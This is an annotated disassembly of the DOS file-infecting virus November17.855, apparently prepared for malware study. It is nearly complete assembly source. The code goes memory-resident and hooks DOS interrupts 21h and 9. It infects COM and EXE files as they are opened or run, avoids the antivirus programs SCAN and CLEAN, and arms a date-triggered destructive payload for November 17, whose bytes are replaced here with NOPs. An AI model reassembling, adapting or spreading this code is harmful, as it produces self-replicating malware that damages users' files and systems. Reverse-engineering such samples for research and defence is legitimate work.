; Disassembly of `Virus.DOS.November17.855.a`.
;
; Source: COM file (MD5: 5beaaaf2a7051f8f34b525e88d93755e)

      org 100h

;-------------------------------------------------------------------------------
; HOST
;-------------------------------------------------------------------------------

host:
      PUSH CS
      MOV  CX, $virus_begin
      PUSH CX
      RETF

      dw k_exe_magic_number                       ; infected file!
      times 992 db 0

;-------------------------------------------------------------------------------
; CONSTANTS
;-------------------------------------------------------------------------------

k_are_you_there:              equ 'VX'
k_exe_magic_number:           equ 'MZ'
k_infection_marker:           equ 'MZ'
k_payload_activation_counter: equ 500             ; decremented after each INT 9 call; on 0, the payload is
                                                  ; activated
k_resident_memory_paragraphs: equ (virus_end_in_memory-virus_begin)/16+1
k_exe_header_size:            equ r_payload_activation_counter-v_exe_header

vars_base:                    equ $-100h          ; see base frame routine

;-------------------------------------------------------------------------------
; VIRUS BEGIN
;-------------------------------------------------------------------------------

virus_begin:

store_base_frame:

      CALL  next
next: POP   SI
      SUB   SI, next-vars_base                    ; uses an unusual base frame (virus_begin-100h) in order to
                                                  ; avoid the standard base frame pattern.
check_memory_residence:

      PUSH AX
      XOR  AX, AX
      MOV  DS, AX
      PUSH CS
      CMP  WORD [20Ch], k_are_you_there           ; int 83h
      POP  DS
      CLD
      JNZ  install_in_memory_preparations

return_to_host:

      TEST BYTE [SI+v_flags-vars_base], k_flag_exe_infection
      JNZ  return_to_host_from_exe
      JMP  return_to_host_from_com

return_to_host_from_exe:

      MOV  CX, ES
      MOV  BX, CX
      ADD  [SI+v_com_string+1-vars_base], BX
      ADD  BX, 10h
      ADD  BX, [SI+v_com_header-vars_base]
      CLI
      POP  AX
      MOV  SS, BX
      MOV  SP, [SI+v_com_header+2-vars_base]
      MOV  DS, CX
      STI
      JMP  FAR [CS:SI+v_com_header+4-vars_base]

install_in_memory_preparations:

      AND  BYTE [SI+v_flags-vars_base], ~k_flag_activate_payload

check_if_current_mcb_is_last:

      MOV  [SI+v_curr_segment-vars_base], ES
      MOV  BX, ES
      DEC  BX                                     ; prior paragraph (MCB data structure)
      XOR  DI, DI
      MOV  DS, BX
      CMP  BYTE [DI], 'Z'                         ; last entry in the MCB chain?
      JNZ  return_to_host

decrease_free_memory:

      MOV  AX, [DI+3]                             ; length of the MCB; the end is the top of memory
      SUB  AX, k_resident_memory_paragraphs       ; reserve memory
      SUB  WORD [DI+12h], k_resident_memory_paragraphs
      MOV  [DI+3], AX                             ; decrease the memory available
      INC  BX
      ADD  AX, BX
      MOV  ES, AX

copy_virus_to_memory:

      PUSH CS
      POP  DS
      MOV  CX, virus_end_in_file-virus_begin
      ADD  SI, 100h
      REPZ
      MOVSB

      SUB  AX, 10h                                ; indirect jump to hijack_interrupts
      PUSH AX
      MOV  AX, 17Ch
      PUSH AX
      RETF

hijack_interrupts:

      PUSH CS
      XOR  AX, AX
      POP  ES
      MOV  DS, AX
      MOV  SI, 84h                                ; INT 21h
      MOV  DI, r_int_21-vars_base
      MOVSW
      MOVSW

      MOV  SI, 24h                                ; INT 9
      MOVSW
      MOVSW

      MOV  WORD [84h], 1D5h                       ; store addresses
      MOV  [86h], CS
      MOV  WORD [24h], int_9_handler-vars_base
      MOV  [26h], CS

      MOV  WORD [20Ch], k_are_you_there           ; store "are you there?"
      PUSH CS
      POP  DS
      MOV  ES, [v_curr_segment-vars_base]         ; load current segment
      MOV  WORD [r_payload_activation_counter-vars_base], k_payload_activation_counter
      XOR  SI, SI
      TEST BYTE [v_flags-vars_base], k_flag_exe_infection
      JZ   return_to_host_from_com
      JMP  return_to_host_from_exe

; restore original 8 bytes of the entry point for COM files, and jump there

return_to_host_from_com:

      ADD  SI, v_com_header-vars_base
      MOV  DI, 100h
      MOV  BX, DI
      MOV  CX, 4
      REPZ MOVSW
      POP  AX
      PUSH ES
      PUSH ES
      POP  DS
      PUSH BX
      RETF

int_21_handler:

      CMP  AH, 3Dh                               ; open file?
      JNZ  not_open_file
      TEST AL, 1                                 ; open file for writing?
      JZ   infect_if_not_virus_call
not_open_file:
      CMP  AH, 43h                               ; get/set file attributes?
      JZ   infect_if_not_virus_call
      CMP  AX, 4B00h                             ; execution?
      JZ   infection_preparations

invoke_original_int_21_call:

      JMP invoke_original_int_21

exit_from_infection:

      POP  CX
      JMP  is_payload_active

infect_if_not_virus_call:

      TEST BYTE [CS:v_flags-vars_base], k_flag_infection_initiated
      JNZ  invoke_original_int_21_call

infection_preparations:

      PUSH AX                                     ; save all flags
      PUSH BX
      PUSH CX
      PUSH DX
      PUSH DI
      PUSH SI
      PUSH BP
      PUSH ES
      PUSH DS
      PUSH DS

      OR BYTE [CS:v_flags-vars_base], k_flag_infection_initiated

      MOV  DI, DX                                 ; make sure there is a dot in the name
      PUSH DS
      POP  ES
      PUSH CS
      POP  DS
      MOV  CX, 80h
      CLD
      MOV  AL, '.'
      REPNZ SCASB
      JNZ  exit_from_infection

      MOV  BX, DI                                 ; check extension
      MOV  SI, v_com_string-vars_base
      MOV  CL, 3
      REPZ CMPSB
      JZ   start_infection                        ; COM

      XCHG BX, DI
      MOV  SI, v_exe_string-vars_base
      MOV  CL, 3
      REPZ CMPSB
      JNZ  exit_from_infection

      STD                                         ; EXE file. search for a backslash; if the filename (including extension)
      MOV  CL, 14h                                ; is 20 chars or longer, exit.
      MOV  AL, '\'
      REPNZ SCASB
      JNZ  exit_from_infection
      INC  DI                                     ; move to filename beginning
      INC  DI
      CLD
      MOV  BX, DI

check_if_executable_is_scan_av:

      MOV  CL, 5
      MOV  SI, v_antivirus_scan_string-vars_base
      REPZ CMPSB
      JZ exit_from_infection

check_if_executable_is_clean_av:

      XCHG DI, BX
      MOV  CL, 6
      MOV  SI, v_antivirus_clean_string-vars_base
      REPZ CMPSB
      JZ   exit_from_infection

start_infection:

      XOR  AX, AX                                 ; Hijack INT 24h for error handling
      MOV  DS, AX
      LES  AX, [90h]
      MOV  WORD [90h], int_24_handler-vars_base
      MOV  [92h], CS
      POP  DS
      PUSH ES
      PUSH AX

      MOV  SI, r_filename-vars_base               ; get file attributes
      MOV  [CS:SI], DX
      MOV  [CS:SI+2], DS
      MOV  AX, 4300h
      INT  21h
      JB   invoke_restore_int_24

      XCHG SI, CX                                 ; reset attribs to 'archive' (bit 5)
      MOV  CX, 20h
      MOV  AX, 4301h
      INT  21h
      JNB  file_attributes_reset_ok
invoke_restore_int_24:
      JMP  restore_int_24
file_attributes_reset_ok:
      MOV  AX, 3D02h                              ; open file for R/W
      INT  21h
      JNB  file_opened_ok
      JMP  close_file
file_opened_ok:
      XCHG BX, AX                                 ; AX=file handle; BX is for the save timestamp,
      MOV  BP, BX                                 ; BP is saved, in case it's needed later.
      PUSH CS
      POP  DS

      MOV  AX, 5700h                              ; save timestamp
      INT  21h
      JB   exit_without_infection_2
      MOV  [r_time-vars_base], CX
      MOV  [r_date-vars_base], DX

      AND  BYTE [v_flags-vars_base], ~k_flag_exe_infection

copy_header:

      MOV  DX, v_com_header-vars_base             ; read two bytes into v_com_header
      MOV  CX, 2
      MOV  AH, 3Fh
      INT  21h
      JB   exit_without_infection_2

      ADD  CL, 4                                  ; prepare parameters for COM file (read other 6 bytes - 8 in total)
      INC  DX
      INC  DX                                     ; DX=v_com_header+2
      MOV  DI, v_com_header+6-vars_base           ; DI=infection marker location

      CMP  WORD [v_com_header-vars_base], k_exe_magic_number
      JNZ  read_heading_bytes

      OR   BYTE [v_flags-vars_base], k_flag_exe_infection

      MOV  CL, k_exe_header_size-2                ; prepare parameters for EXE file
      MOV  DX, v_exe_header+2-vars_base
      MOV  DI, v_exe_header+12h-vars_base         ; DI=infection marker location; EXE 12h=usable space in exe header

read_heading_bytes:

      MOV  AH, 3Fh
      INT  21h
      JB   exit_without_infection_2

      CMP  WORD [DI], k_infection_marker          ; don't infect if equal to infection marker
      MOV  DI, DX
      JNZ  move_to_file_end
      JMP  close_file

move_to_file_end:

      MOV  AX, 4202h                              ; move the end of the file
      XOR  CX, CX
      XOR  DX, DX
      INT  21h
      JB   exit_without_infection_2

      TEST BYTE [v_flags-vars_base], k_flag_exe_infection
      JNZ  exe_file_checks

com_file_checks:

      OR   DX, DX                                 ; DX:AX=size -> don't infect if > 64K
      JNZ  exit_without_infection_2
      CMP  AX, 0EA60h                             ; don't infect if size > 60K
      JA   exit_without_infection_2

      ADD  AX, 100h
      MOV  [v_com_entry_point-vars_base], AX
      JMP  append_virus

exit_without_infection_1:

      POP  CX
      POP  CX

exit_without_infection_2:

      MOV  BX, BP                                 ; BP is the file handle, saved in :file_opened_ok
      JMP  restore_original_timestamp

exe_file_checks:                                  ; NOTE: DI is exe header@02h (see :copy_header+:read_heading_bytes)

      PUSH DX                                     ; save file length in DX:AX
      PUSH AX
      CMP  WORD [DI+8], +14h                      ; header@Ah: don't infect if minimum memory left is less than 20 paragraphs
      JB   exit_without_infection_1

check_declared_program_length:

      MOV  AX, [DI+2]                             ; header@4h: Length of program in 512 byte pages
      MOV  BX, [DI]                               ; header@2h: Length of last non-full page.
      OR   BX, BX
      JZ   last_page_empty_1
      DEC  AX
last_page_empty_1:                                ; perform the computations
      MOV  CX, 200h
      MUL  CX
      ADD  AX, BX
      ADC  DX, +0
      POP  BX                                     ; low word of file size (see :exe_file_checks)
      CMP  BX, AX
      POP  BX                                     ; high word of file size (see :exe_file_checks)
      JNZ  exit_without_infection_2               ; if the declared program length (low word) doesn't match the file, don't infect
      CMP  BX, DX
      JNZ  exit_without_infection_2               ; don't infect if high word doesn't match file size

declared_program_length_ok:

      PUSH AX                                     ; save file length
      PUSH DX                                     ; ^^
      LES  BX, [DI+12h]                           ; header@14h: EXE IP
      MOV  [v_com_header+6-vars_base], ES
      MOV  [v_com_header+4-vars_base], BX
      LES  BX, [DI+0Ch]                           ; header@0Eh: Segment correction for stack (SS)
      MOV  [v_com_header-vars_base], BX
      MOV  [v_com_header+2-vars_base], ES
      MOV  CX, 10h
      DIV  CX
      SUB  AX, [DI+6]                             ; header@08h: Header length in paragraphs
      SUB  AX, 10h
      MOV  [DI+14h], AX                           ; header@16h: Segment correction for CS
      ADD  DX, 100h
      MOV  [DI+12h], DX                           ; header@14h: Value of IP
      ADD  DX, 497h
      MOV  [DI+0Eh], DX                           ; header@10h: Value of SP
      MOV  [DI+0Ch], AX                           ; header@0Eh: Segment correction for CS
      POP  DX                                     ; file length (see above)
      POP  AX                                     ; ^^
      ADD  AX, virus_end_in_file-virus_begin      ; add file size, then prepare values for
      ADC  DX, +0
      MOV  CX, 200h
      DIV  CX
      OR   DX, DX
      JZ   last_page_empty_2
      INC  AX
last_page_empty_2:
      MOV  [DI+2], AX                             ; header@04h: Length of program in 512 byte pages
      MOV  [DI], DX                               ; header@02h: Length of last non-full page.
      MOV  WORD [DI+10h], k_infection_marker      ; header@12h: usable space in exe header; used for infection marker

append_virus:

      MOV  BX, BP                                 ; append the virus
      MOV  DX, 100h
      MOV  CX, virus_end_in_file-virus_begin
      MOV  AH, 40h
      INT  21h
      JB   restore_original_timestamp
      SUB  AX, CX
      JNZ  restore_original_timestamp

      MOV  AX, 4200h                              ; move at BOF
      XOR  CX, CX
      XOR  DX, DX
      INT  21h
      JB   restore_original_timestamp

      MOV  DX, v_exe_header-vars_base             ; prepare for exe...
      MOV  CL, k_exe_header_size                  ;
      TEST BYTE [v_flags-vars_base], k_flag_exe_infection
      JNZ  write_to_file

      MOV  DX, ComFilesJumpRoutine-vars_base      ; ... change to com
      MOV  CL, 8

write_to_file:

      MOV  AH, 40h
      INT  21h

restore_original_timestamp:

      MOV  AX, 5701h                              ; restore original timestamp
      MOV  CX, [r_time-vars_base]
      MOV  DX, [r_date-vars_base]
      INT  21h

close_file:

      MOV  AH, 3Eh                                ; close file
      INT  21h

      XCHG CX, SI                                 ; restore attributes
      LDS  DX, [r_filename-vars_base]
      MOV  AX, 4301h
      INT  21h

restore_int_24:

      XOR  AX, AX                                 ; restore INT 24h
      MOV  DS, AX
      MOV  DI, 90h
      POP  WORD [DI]
      POP  WORD [DI+2]

is_payload_active:

      TEST BYTE [CS:v_flags-vars_base], k_flag_activate_payload
      JZ   restore_all_registers

check_if_date_is_nov_17th:

      MOV  AH, 2Ah
      INT  21h
      CMP  DH, 0Bh
      JNZ  restore_all_registers
      CMP  DL, 11h
      JB   restore_all_registers                  ; no: don't destroy

destroy_data:

      times 12 db 90h                             ; destructive code

      POP  AX

restore_all_registers:

      POP  DS
      POP  ES
      POP  BP
      POP  SI
      POP  DI
      POP  DX
      POP  CX
      POP  BX
      POP  AX

      AND  BYTE [CS:v_flags-vars_base], ~k_flag_infection_initiated

invoke_original_int_21:

      JMP  FAR [CS:r_int_21-vars_base]

int_24_handler:

      MOV  AL, 0
      IRET

int_9_handler:

      CMP  WORD [CS:r_payload_activation_counter-vars_base], 0
      JNZ  dont_activate_payload_yet
      OR   BYTE [CS:v_flags-vars_base], k_flag_activate_payload
dont_activate_payload_yet:
      DEC  WORD [CS:r_payload_activation_counter-vars_base]
      JMP  FAR [CS:r_int_6-vars_base]

;-------------------------------------------------------------------------------
; VIRUS VARIABLES
;-------------------------------------------------------------------------------

v_flags:                    db 21h
k_flag_infection_initiated: equ 1
k_flag_exe_infection:       equ 2
k_flag_activate_payload:    equ 4                 ; if true, payload is activated (and executed on Nov 17h).
                                                  ; it is set after a certain number of INT 9 calls are made.

v_curr_segment:             dw 1862h

v_com_header:               db 0CDh, 20h, 0, 0, 0, 0
                            dw 0                  ; 'MZ' when infected

v_unknown:                  dw 0                  ; looks like this is not used (!!!)

v_antivirus_scan_string:    db 'SCAN.'
v_antivirus_clean_string:   db 'CLEAN.'

v_com_string:               db 'COM'
v_exe_string:               db 'EXE'

ComFilesJumpRoutine:                              ; 6 bytes
      PUSH CS
      MOV  CX, 4E8h
v_com_entry_point: equ $-2
      PUSH CX
      RETF

v_exe_header:               dw k_exe_magic_number ; overflows into the in memory buffer.
                                                  ; index 12h=k_infection_marker when infected

virus_end_in_file:

;-------------------------------------------------------------------------------
; IN-MEMORY BUFFER
;-------------------------------------------------------------------------------

in_memory_buffer:             times 22 db 0

r_payload_activation_counter: dw 0

r_date:                       dw 0
r_time:                       dw 0

r_int_21:                     dd 0
r_int_6:                      dd 0

r_filename:                   dd 0

virus_end_in_memory:
